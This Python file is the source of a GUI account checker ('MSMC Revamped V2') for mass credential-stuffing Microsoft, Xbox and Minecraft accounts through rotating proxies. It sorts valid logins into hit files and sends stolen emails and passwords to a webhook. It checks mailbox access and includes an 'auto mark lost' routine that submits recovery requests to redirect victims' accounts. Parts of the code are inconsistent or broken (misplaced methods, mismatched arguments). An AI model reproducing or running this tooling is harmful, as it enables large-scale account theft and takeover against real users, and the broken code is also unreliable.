import requests
import re
import os
import time
import threading
import random
import urllib3
import configparser
import json
import concurrent.futures
import uuid
import socket
import socks
import sys
import warnings
from datetime import datetime, timezone
from colorama import Fore, init
from urllib.parse import urlparse, parse_qs
from io import StringIO
from pathlib import Path

from PyQt6.QtWidgets import (QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, 
                            QHBoxLayout, QPushButton, QLabel, QProgressBar, QTableWidget, 
                            QTableWidgetItem, QFileDialog, QSpinBox, QComboBox, QCheckBox,
                            QTextEdit, QLineEdit, QFormLayout, QGroupBox, QSplitter, QMessageBox)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt6.QtGui import QFont, QIcon, QColor

from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect


init(autoreset=True)


urllib3.disable_warnings()
warnings.filterwarnings("ignore")


CONNECTION_TIMEOUT = 10

class Config:
    def __init__(self):
        self.data = {}
        self.data = {
            'maxretries': 3,
            'proxytype': 'http',
            'webhook': '',
            'message': '',
            'hypixelname': False,
            'hypixellevel': False,
            'hypixelfirstlogin': False,
            'hypixellastlogin': False,
            'hypixelbwstars': False,
            'hypixelsbcoins': False,
            'optifinecape': False,
            'access': False,
            'namechange': False,
            'lastchanged': False,
            'hypixelban': False,
            'automarklost': False,
            'recoveryemail': ''
        }

    def set(self, key, value):
        self.data[key] = value

    def get(self, key, default=None):
        return self.data.get(key, default)

    def load_from_file(self, filepath):
        if os.path.exists(filepath):
            try:
                parser = configparser.ConfigParser()
                parser.read(filepath)
                
                if 'Settings' in parser:
                    settings = parser['Settings']
                    for key in settings:
                        if key in ['hypixelname', 'hypixellevel', 'hypixelfirstlogin', 
                                   'hypixellastlogin', 'hypixelbwstars', 'hypixelsbcoins', 
                                   'optifinecape', 'access', 'namechange', 'lastchanged', 'hypixelban']:
                            self.data[key] = settings.getboolean(key)
                        elif key == 'maxretries':
                            self.data[key] = settings.getint(key)
                        else:
                            self.data[key] = settings[key]
                            
                return True
            except Exception as e:
                print(f"Error loading config: {e}")
                return False
        return False

    def save_to_file(self, filepath):
        try:
            parser = configparser.ConfigParser()
            parser['Settings'] = {}
            
            for key, value in self.data.items():
                parser['Settings'][key] = str(value)
                
            with open(filepath, 'w') as f:
                parser.write(f)
            return True
        except Exception as e:
            print(f"Error saving config: {e}")
            return False

config = Config()


class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.ban_proxies = []
        self.last_used = 0
        self.lock = threading.Lock()
    
    def load_proxies(self, proxy_list):
        self.proxies = proxy_list
        random.shuffle(self.proxies)
    
    def load_ban_proxies(self, proxy_list):
        self.ban_proxies = proxy_list
        random.shuffle(self.ban_proxies)
    
    def get_proxy(self, proxy_type='http'):
        with self.lock:
            if not self.proxies:
                return None
                

            self.last_used = (self.last_used + 1) % len(self.proxies)
            proxy = self.proxies[self.last_used]

            if '@' in proxy:
                auth, ip_port = proxy.split('@')
                username, password = auth.split(':')
                host, port = ip_port.split(':')
                
                proxy_dict = {
                    'http': f'{proxy_type}://{username}:{password}@{host}:{port}',
                    'https': f'{proxy_type}://{username}:{password}@{host}:{port}'
                }
            else:
                host, port = proxy.split(':')
                proxy_dict = {
                    'http': f'{proxy_type}://{host}:{port}',
                    'https': f'{proxy_type}://{host}:{port}'
                }
                
            return proxy_dict
    
    def get_ban_proxy(self):
        if not self.ban_proxies:
            return None
        return random.choice(self.ban_proxies)

proxy_manager = ProxyManager()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.hypixel = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixel != None: message+=f"\nHypixel: {self.hypixel}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def notify(self):
        global errors
        try:
            payload = {
                "content": config.get('message')
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixel or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<banned>", self.banned or "Unknown")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A"),
                "username": "Klyte"
            }
            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except: pass
            
        try:
            replacements = {
                "<email>": self.email,
                "<password>": self.password,
                "<name>": self.name or "N/A",
                "<hypixel>": self.hypixel or "N/A",
                "<level>": self.level or "N/A",
                "<firstlogin>": self.firstlogin or "N/A",
                "<lastlogin>": self.lastlogin or "N/A",
                "<ofcape>": self.cape or "N/A",
                "<capes>": self.capes or "N/A",
                "<access>": self.access or "N/A",
                "<skyblockcoins>": self.sbcoins or "N/A",
                "<bedwarsstars>": self.bwstars or "N/A",
                "<banned>": self.banned or "Unknown",
                "<namechange>": self.namechanged or "N/A",
                "<lastchanged>": self.lastchanged or "N/A",
                "<type>": self.type or "N/A"
            }
            
            content = message_template
            for placeholder, value in replacements.items():
                content = content.replace(placeholder, value)
                
            payload = {
                "content": content,
                "username": "MCChecker"
            }
            
            self.session.post(webhook_url, json=payload, timeout=CONNECTION_TIMEOUT)
        except Exception as e:
            pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixel = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

        try:
            for _ in range(3):  
                try:
                    self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
                    response = self.session.get(
                        f'https://plancke.io/hypixel/player/stats/{self.name}',
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'},
                        timeout=CONNECTION_TIMEOUT
                    )
                    
                    if response.status_code == 200:
                        tx = response.text
                        break
                except Exception:
                    continue
            else:
                return  
                
            
            if config.get('hypixelname') is True:
                try: 
                    self.hypixel = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                
            if config.get('hypixellevel') is True:
                try: 
                    self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                
            if config.get('hypixelfirstlogin') is True:
                try: 
                    self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                
            if config.get('hypixellastlogin') is True:
                try: 
                    self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                
            if config.get('hypixelbwstars') is True:
                try: 
                    self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass

            
            if config.get('hypixelsbcoins') is True:
                try:
                    self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
                    req = self.session.get(
                        f"https://sky.shiiyu.moe/stats/{self.name}", 
                        timeout=CONNECTION_TIMEOUT
                    )
                    if req.status_code == 200:
                        self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except Exception as e:
            pass

    def check_optifine_cape(self):
        if not config.get('optifinecape'):
            return
            
        try:
            for _ in range(2):  
                try:
                    self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
                    response = self.session.get(
                        f'http://s.optifine.net/capes/{self.name}.png',
                        timeout=CONNECTION_TIMEOUT
                    )
                    
                    if "Not found" in response.text: 
                        self.cape = "No"
                    else: 
                        self.cape = "Yes"
                    break
                except:
                    continue
            else:
                self.cape = "Unknown"
        except:
            self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text) #my mailaccess checking api pls dont rape or it will go offline prob (weak hosting)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"

    def check_namechange(self, max_retries=3):
        if not config.get('namechange') and not config.get('lastchanged'):
            return
            
        for _ in range(max_retries):
            try:
                self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
                response = self.session.get(
                    'https://api.minecraftservices.com/minecraft/profile/namechange',
                    headers={'Authorization': f'Bearer {self.token}'},
                    timeout=CONNECTION_TIMEOUT
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        if config.get('namechange') is True:
                            self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            
                        if config.get('lastchanged') is True:
                            created_at = data.get('createdAt')
                            if created_at:
                                try:
                                    given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                except ValueError:
                                    given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    
                                given_date = given_date.replace(tzinfo=timezone.utc)
                                formatted = given_date.strftime("%m/%d/%Y")
                                current_date = datetime.now(timezone.utc)
                                difference = current_date - given_date
                                
                                years = difference.days // 365
                                months = (difference.days % 365) // 30
                                days = difference.days

                                if years > 0:
                                    self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                elif months > 0:
                                    self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                else:
                                    self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                        return
                    except:
                        pass
                elif response.status_code == 429:
                    time.sleep(1)  
            except:
                pass

    def check_ban_status(self, max_retries=2):
        if not config.get('hypixelban') or not self.token or not self.uuid:
            return

        auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
        auth_token.profile = Profile(id_=self.uuid, name=self.name)
        
        for attempt in range(max_retries):
            try:
                
                proxy = proxy_manager.get_ban_proxy()
                if proxy:
                    if '@' in proxy:
                        auth, ip_port = proxy.split('@')
                        username, password = auth.split(':')
                        host, port = ip_port.split(':')
                        socks.set_default_proxy(socks.SOCKS5, addr=host, port=int(port), username=username, password=password)
                    else:
                        host, port = proxy.split(':')
                        socks.set_default_proxy(socks.SOCKS5, addr=host, port=int(port))
                    socket.socket = socks.socksocket
                
                
                connection = Connection(
                    "alpha.hypixel.net", 25565, 
                    auth_token=auth_token, 
                    initial_version=47, 
                    allowed_versions={"1.8", 47}
                )
                
               
                original_stderr = sys.stderr
                sys.stderr = StringIO()
                
                event = threading.Event()
                
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                    event.set()

                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    self.banned = "False"
                    event.set()
                
                
                try:
                    connection_thread = threading.Thread(target=connection.connect)
                    connection_thread.daemon = True
                    connection_thread.start()
                    
                    # wait timeout
                    if event.wait(5):  # 5 second
                        connection.disconnect()
                        if self.banned is not None:
                            break
                    else:
                        # timeout RIP
                        connection.disconnect()
                except:
                    pass
                
                
                sys.stderr = original_stderr
                
                
                if proxy:
                    socket.socket = socket._real_socket
                    
            except:
                if proxy:
                    socket.socket = socket._real_socket
                continue
        
        # no status
        if self.banned is None:
            self.banned = "Unknown"

    def process_account(self, result_folder):
        
        with open(f"{result_folder}/Hits.txt", 'a') as file: 
            file.write(f"{self.email}:{self.password}\n")
        
        # name check
        if self.name != 'N/A':
            
            threads = []
            
            
            t1 = threading.Thread(target=self.fetch_hypixel_data)
            threads.append(t1)
            t1.start()
            
            
            t2 = threading.Thread(target=self.check_optifine_cape)
            threads.append(t2)
            t2.start()
            
            
            for t in threads:
                t.join()
            
            
            is_mfa = self.check_full_access()
            if is_mfa:
                with open(f"{result_folder}/MFA.txt", 'a') as f:
                    f.write(f"{self.email}:{self.password}\n")
            else:
                with open(f"{result_folder}/SFA.txt", 'a') as f:
                    f.write(f"{self.email}:{self.password}\n")
            
            
            self.check_namechange(max_retries=config.get('maxretries'))
            
            
            self.check_ban_status(max_retries=config.get('maxretries'))
            if self.banned is not None:
                if self.banned == "False":
                    with open(f"{result_folder}/Unbanned.txt", 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
                else:
                    with open(f"{result_folder}/Banned.txt", 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
        
        # capture
        with open(f"{result_folder}/Capture.txt", 'a') as f:
            f.write(self.builder())
        
        # webhook
        self.notify()
        
        
        return {
            "email": self.email,
            "password": self.password,
            "name": self.name,
            "type": self.type,
            "capes": self.capes,
            "hypixel": self.hypixel,
            "level": self.level,
            "cape": self.cape,
            "access": self.access,
            "banned": self.banned,
            "namechanged": self.namechanged
        }

class AccountChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
    

def auto_mark_lost(self, email, password, recovery_email):
    try:
        print(f"Marking lost: {email} -> {recovery_email}")
        response = self.session.post(
            "https://account.live.com/acsr",
            data={
                "EmailAddress": email,
                "Password": password,
                "RecoveryEmail": recovery_email,
                "flag": "automarklost"
            },
            timeout=10
        )
        if response.status_code == 200:
            print(f"[+] Marked as lost: {email}")
            with open("results/MarkedLost.txt", "a") as f:
                f.write(f"{email}:{password} -> {recovery_email}\n")
        else:
            print(f"[-] Failed to mark: {email} (status {response.status_code})")
    except Exception as e:
        print(f"[!] Exception marking lost: {email} - {e}")

    def get_authentication_url_and_tag(self):
        url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        
        for _ in range(3):  
            try:
                self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
                r = self.session.get(url, timeout=CONNECTION_TIMEOUT)
                text = r.text
                
                
                match = re.search(r'name="PPFT" id="[^"]+" value="([^"]+)"', text)
                if match:
                    sFTTag = match.group(1)
                    
                   
                    url_match = re.search(r"urlPost:'([^']+)'", text)
                    if url_match:
                        return url_match.group(1), sFTTag
            except Exception as e:
                pass
                
        return None, None
        
    def get_xbox_token(self, email, password):
        url_post, sFTTag = self.get_authentication_url_and_tag()
        if not url_post or not sFTTag:
            return None, "error"
            
        data = {
            'login': email, 
            'loginfmt': email, 
            'passwd': password, 
            'PPFT': sFTTag
        }
        
        for _ in range(config.get('maxretries')):
            try:
                self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
                login_request = self.session.post(
                    url_post, 
                    data=data, 
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
                    allow_redirects=True, 
                    timeout=CONNECTION_TIMEOUT
                )
                
                # success log in
                if '#' in login_request.url and login_request.url != url_post:
                    fragments = urlparse(login_request.url).fragment
                    token = parse_qs(fragments).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                
                # 2FA
                elif any(value in login_request.text for value in [
                    "recover?mkt", 
                    "account.live.com/identity/confirm?mkt", 
                    "Email/Confirm?mkt", 
                    "/Abuse?mkt="
                ]):
                    return None, "2fa"
                
                # acc recovery
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        data = {
                            'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                            'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                            'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                        }
                        action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                        
                        ret = self.session.post(
                            action_url, 
                            data=data, 
                            allow_redirects=True,
                            timeout=CONNECTION_TIMEOUT
                        )
                        
                        return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text)
                        if return_url:
                            fin = self.session.get(
                                return_url.group(), 
                                allow_redirects=True,
                                timeout=CONNECTION_TIMEOUT
                            )
                            
                            fragments = urlparse(fin.url).fragment
                            token = parse_qs(fragments).get('access_token', ["None"])[0]
                            if token != "None":
                                return token, "success"
                    except:
                        pass
                
                # invalid creds
                elif any(value in login_request.text.lower() for value in [
                    "password is incorrect", 
                    r"account doesn\'t exist.", 
                    "sign in to your microsoft account", 
                    "tried to sign in too many times with an incorrect account or password"
                ]):
                    return None, "invalid"
                    
            except Exception as e:
                pass
                
        return None, "error"
        
    def authenticate_xbox_live(self, ms_token):
        try:
            self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
            xbox_login = self.session.post(
                'https://user.auth.xboxlive.com/user/authenticate', 
                json={
                    "Properties": {
                        "AuthMethod": "RPS", 
                        "SiteName": "user.auth.xboxlive.com", 
                        "RpsTicket": ms_token
                    }, 
                    "RelyingParty": "http://auth.xboxlive.com", 
                    "TokenType": "JWT"
                }, 
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
                timeout=CONNECTION_TIMEOUT
            )
            
            if xbox_login.status_code == 200:
                js = xbox_login.json()
                return js.get('Token'), js['DisplayClaims']['xui'][0]['uhs']
            return None, None
        except:
            return None, None
            
    def get_xsts_token(self, xbox_token):
        try:
            self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
            xsts_response = self.session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize', 
                json={
                    "Properties": {
                        "SandboxId": "RETAIL", 
                        "UserTokens": [xbox_token]
                    }, 
                    "RelyingParty": "rp://api.minecraftservices.com/", 
                    "TokenType": "JWT"
                }, 
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
                timeout=CONNECTION_TIMEOUT
            )
            
            if xsts_response.status_code == 200:
                return xsts_response.json().get('Token')
            return None
        except:
            return None
            
    def get_minecraft_token(self, uhs, xsts_token):
        for _ in range(3):  
            try:
                self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
                mc_login = self.session.post(
                    'https://api.minecraftservices.com/authentication/login_with_xbox', 
                    json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, 
                    headers={'Content-Type': 'application/json'}, 
                    timeout=CONNECTION_TIMEOUT
                )
                
                if mc_login.status_code == 200:
                    return mc_login.json().get('access_token')
                elif mc_login == 429:
                    time.sleep(1)  
            except:
                pass
        return None
            
    def get_minecraft_profile(self, access_token):
        try:
            self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
            profile_response = self.session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {access_token}'},
                timeout=CONNECTION_TIMEOUT
            )
            
            if profile_response.status_code == 200:
                profile_data = profile_response.json()
                return {
                    'name': profile_data.get('name', 'N/A'),
                    'uuid': profile_data.get('id', 'N/A'),
                    'skins': profile_data.get('skins', []),
                    'capes': ', '.join([cape.get('alias', 'Unknown') for cape in profile_data.get('capes', [])])
                }
            return None
        except:
            return None
            
    def check_minecraft_entitlements(self, access_token):
        try:
            self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
            entitlements = self.session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {access_token}'},
                timeout=CONNECTION_TIMEOUT
            )
            
            if entitlements.status_code == 200:
                data = entitlements.json()
                entitlement_types = []
                
                for item in data.get('items', []):
                    name = item.get('name', '')
                    if name:
                        entitlement_types.append(name)
                        
                if 'product_minecraft' in entitlements.text:
                    account_type = "Normal"
                elif 'product_game_pass_ultimate' in entitlements.text:
                    account_type = "Xbox Game Pass Ultimate"
                elif 'product_game_pass_pc' in entitlements.text:
                    account_type = "Xbox Game Pass"
                else:
                    other_products = []
                    if 'product_minecraft_bedrock' in entitlements.text:
                        other_products.append("Minecraft Bedrock")
                    if 'product_legends' in entitlements.text:
                        other_products.append("Minecraft Legends")
                    if 'product_dungeons' in entitlements.text:
                        other_products.append("Minecraft Dungeons")
                        
                    if other_products:
                        account_type = f"Other: {', '.join(other_products)}"
                    else:
                        account_type = "No Minecraft Products"
                        
                return account_type, entitlement_types
            return "Unknown", []
        except:
            return "Unknown", []
            
    def check_account(self, combo, result_folder):
        try:
            email, password = combo.strip().replace(' ', '').split(":", 1)
            if not email or not password:
                return "bad", None
                
            # token
            ms_token, status = self.get_xbox_token(email, password)
            
            # 2FA
            if status == "2fa":
                with open(f"{result_folder}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "2fa", None
                
           
            if ms_token:
                # xbox token
                xbox_token, uhs = self.authenticate_xbox_live(ms_token)
                if not xbox_token or not uhs:
                    # valid microsoft account
                    with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
                        file.write(f"{email}:{password}\n")

                    if config.get('automarklost') and config.get('recoveryemail'):
                        self.auto_mark_lost(email, password, config.get('recoveryemail'))
                    return "vm", None

                    
               
                xsts_token = self.get_xsts_token(xbox_token)
                if not xsts_token:
                    # valid microsoft account
                    with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
                        file.write(f"{email}:{password}\n")
                    return "vm", None
                    
                # Minecraft token
                mc_token = self.get_minecraft_token(uhs, xsts_token)
                if not mc_token:
                    # valid microsoft account
                    with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
                        file.write(f"{email}:{password}\n")
                    return "vm", None
                    
                # minicraft profile
                profile = self.get_minecraft_profile(mc_token)
                if not profile:
                    # mc have but no name set
                    account_type, entitlements = self.check_minecraft_entitlements(mc_token)
                    capture = Capture(email, password, "N/A", "N/A", "N/A", mc_token, account_type)
                    account_data = capture.process_account(result_folder)
                    return account_type.lower().replace(" ", "_"), account_data
                    
               
                account_type, entitlements = self.check_minecraft_entitlements(mc_token)
                
                
                capture = Capture(
                    email=email,
                    password=password,
                    name=profile.get('name', 'N/A'),
                    capes=profile.get('capes', 'N/A'),
                    uuid_val=profile.get('uuid', 'N/A'),
                    token=mc_token,
                    account_type=account_type
                )
                
               
                account_data = capture.process_account(result_folder)
                
                # categorize acc
                if 'gamepass_ultimate' in account_type.lower():
                    return "xgpu", account_data
                elif 'gamepass' in account_type.lower():
                    return "xgp", account_data
                elif 'normal' in account_type.lower():
                    return "hit", account_data
                else:
                    return "other", account_data
            
            return "bad", None
        except Exception as e:
            return "error", None


class CheckerWorker(QThread):
    progress_signal = pyqtSignal(int)
    stats_signal = pyqtSignal(dict)
    result_signal = pyqtSignal(dict)
    finished_signal = pyqtSignal()
    
    def __init__(self, combos, proxylist, ban_proxies, thread_count, result_folder):
        super().__init__()
        self.combos = combos
        self.proxylist = proxylist
        self.ban_proxies = ban_proxies
        self.thread_count = thread_count
        self.result_folder = result_folder
        self.stats = {
            "hits": 0,
            "bad": 0,
            "twofa": 0,
            "cpm": 0,
            "errors": 0,
            "retries": 0,
            "checked": 0,
            "vm": 0,
            "sfa": 0,
            "mfa": 0,
            "xgp": 0,
            "xgpu": 0,
            "other": 0
        }
        self.running = False
        self.cpm_counter = 0
        self.cpm_lock = threading.Lock()
        
    def run(self):
        self.running = True
        
       
        proxy_manager.load_proxies(self.proxylist)
        proxy_manager.load_ban_proxies(self.ban_proxies)
        
        # CPM
        cpm_thread = threading.Thread(target=self.cpm_counter_thread)
        cpm_thread.daemon = True
        cpm_thread.start()
        
        
        os.makedirs(self.result_folder, exist_ok=True)
        
        
        checker = AccountChecker()
        
        
        batch_size = min(1000, len(self.combos))
        for batch_start in range(0, len(self.combos), batch_size):
            if not self.running:
                break
                
            batch_end = min(batch_start + batch_size, len(self.combos))
            batch = self.combos[batch_start:batch_end]
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                future_to_combo = {executor.submit(checker.check_account, combo, self.result_folder): combo for combo in batch}
                
                for i, future in enumerate(concurrent.futures.as_completed(future_to_combo)):
                    if not self.running:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                        
                    try:
                        result_type, account_data = future.result()
                        self.process_result(result_type, account_data)
                    except Exception as e:
                        self.stats["errors"] += 1
                        
                    self.progress_signal.emit(batch_start + i + 1)
                    self.stats["checked"] += 1
                    
                    with self.cpm_lock:
                        self.cpm_counter += 1
                        
                    self.stats_signal.emit(self.stats)
        
        self.finished_signal.emit()
        self.running = False
        
    def process_result(self, result_type, account_data):
        if result_type == "hit":
            self.stats["hits"] += 1
            if account_data and account_data.get("access") == "True":
                self.stats["mfa"] += 1
            elif account_data:
                self.stats["sfa"] += 1
        elif result_type == "2fa":
            self.stats["twofa"] += 1
        elif result_type == "vm":
            self.stats["vm"] += 1
        elif result_type == "xgp":
            self.stats["xgp"] += 1
            self.stats["hits"] += 1
        elif result_type == "xgpu":
            self.stats["xgpu"] += 1
            self.stats["hits"] += 1
        elif result_type == "other":
            self.stats["other"] += 1
            self.stats["hits"] += 1
        elif result_type == "error":
            self.stats["errors"] += 1
        else:
            self.stats["bad"] += 1
            
        if account_data:
            self.result_signal.emit(account_data)

            if config.get('automarklost') and config.get('recoveryemail'):
                if result_type in ["hit", "xgp", "xgpu"] or (account_data.get("access") == "True"):
                    checker = AccountChecker()
                    checker.auto_mark_lost(
                        account_data["email"],
                        account_data["password"],
                        config.get("recoveryemail")
                    )

        
    def stop(self):
        self.running = False
        
    def cpm_counter_thread(self):
        last_checked = 0
        while self.running:
            time.sleep(60)  
            with self.cpm_lock:
                cpm = self.cpm_counter - last_checked
                last_checked = self.cpm_counter
                self.stats["cpm"] = cpm
                self.stats_signal.emit(self.stats)


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MSMC Revamped V2 by Klyte | Enjoy!")
        self.setMinimumSize(1000, 900)
        self.resize(1400, 1000)
        
        config_path = "config.ini"
        config.load_from_file(config_path)
        
        
        self.setup_ui()
        
    def setup_ui(self):
        
        main_widget = QWidget()
        main_layout = QVBoxLayout(main_widget)
        
        
        tabs = QTabWidget()
        checker_tab = QWidget()
        settings_tab = QWidget()
        
        tabs.addTab(checker_tab, "Checker")
        tabs.addTab(settings_tab, "Settings")
        
        
        self.setup_checker_tab(checker_tab)
        
        
        self.setup_settings_tab(settings_tab)
        
        main_layout.addWidget(tabs)
        self.setCentralWidget(main_widget)
        
    def setup_checker_tab(self, tab):
        layout = QVBoxLayout(tab)
        
        
        controls_layout = QHBoxLayout()
        
        # load combos
        self.combo_label = QLabel("0 Combos Loaded")
